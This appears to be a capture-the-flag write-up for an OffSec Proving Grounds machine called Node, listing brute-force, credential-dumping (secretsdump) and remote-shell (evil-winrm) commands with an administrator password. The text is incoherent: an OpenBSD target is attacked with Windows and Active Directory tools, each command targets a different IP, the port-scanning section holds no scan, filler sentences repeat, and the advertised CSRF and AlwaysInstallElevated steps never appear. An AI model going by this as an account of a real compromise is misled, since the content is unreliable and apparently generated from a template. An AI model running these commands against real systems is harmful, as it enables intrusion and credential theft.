---
TitleSEO: "OffSec Proving Grounds — Node (Insane OpenBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Node (Insane OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Node. CSRF and AlwaysInstallElevated to achieve insane compromise on OpenBSD."
Keywords: "active directory, reversing, insane, forensics, hackthebox, linux, windows"
URL: "https://zurefx.github.io/writeups/htb-node-750.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-node-750/"
Date: "2024-01-18"
Tags: "Active Directory, Reversing, Insane, Forensics, HackTheBox, Linux, Windows"
Section: "writeups"
Lang: "en"
main_img: "htb-node-750"
Permalink: "/writeups/htb-node-750.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Node** is rated **Insane** on OffSec Proving Grounds. It runs **OpenBSD** and the IP address during this analysis was `10.11.33.124`.

### Objectives

Lateral movement was facilitated by reusing discovered credentials across services. The scheduled task ran with elevated privileges and could be abused for escalation.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.110.10.243 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.72.186.183
evil-winrm -i 10.15.163.11 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.50.239.15 -u administrator -p 'P@ssw0rd!' --shares
```

The database credentials were hardcoded in the application source code. The target system was identified as running a vulnerable version of the service.

### Service Enumeration

Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
gobuster dir -u http://10.98.197.76/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
feroxbuster -h
crackmapexec smb 10.45.228.153 -u administrator -p 'P@ssw0rd!' --shares
```

The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file.

### SMB Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. The backup files contained sensitive information that should not have been accessible.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.80.163.43
gobuster dir -u http://10.80.228.223/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The application stored sensitive credentials in an unencrypted configuration file. Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible.

## Exploitation

### Vulnerability Identification

Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory. Group Policy Preferences contained encrypted but recoverable credentials.

Key finding: **AlwaysInstallElevated**.

Authentication bypass was achieved through careful manipulation of the login mechanism. Weak file permissions allowed modification of critical system files.

### Initial Access

Unconstrained delegation was enabled on the compromised machine. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.122.77.116/FUZZ
evil-winrm -i 10.11.63.86 -u administrator -p 'P@ssw0rd!'
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Authentication bypass was achieved through careful manipulation of the login mechanism. The service was running without proper input validation, leading to injection vulnerabilities.

## Privilege Escalation

### Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
evil-winrm -i 10.54.31.48 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.46.142.4 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.126.231.157/FUZZ
feroxbuster -h
```

### Exploitation

Initial enumeration revealed several interesting open ports on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.41.89.40
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.98.246.142/FUZZ
```

The application stored sensitive credentials in an unencrypted configuration file. Lateral movement was facilitated by reusing discovered credentials across services.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file.

## Summary

### Tools Used

- `psexec`
- `msfvenom`
- `burpsuite`
- `secretsdump`
- `sqlmap`

### Key Takeaways

- CSRF
- AlwaysInstallElevated
